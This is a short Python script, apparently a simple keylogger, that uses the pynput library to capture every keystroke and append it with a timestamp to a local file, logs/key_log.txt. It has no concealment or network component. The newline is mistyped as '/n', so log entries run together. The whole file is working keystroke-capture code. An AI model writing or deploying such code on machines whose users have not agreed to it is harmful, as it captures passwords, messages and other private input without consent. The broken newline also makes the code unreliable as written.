from pynput import keyboard
from datetime import datetime

def on_press(key):
	with open("logs/key_log.txt", "a") as log:
		try:
			log.write(f"{datetime.now()} - {key.char}/n")
		except AttributeError:
			log.write(f"{datetime.now()} - [{key}]/n")


with keyboard.Listener(on_press=on_press) as listener:
	listener.join()
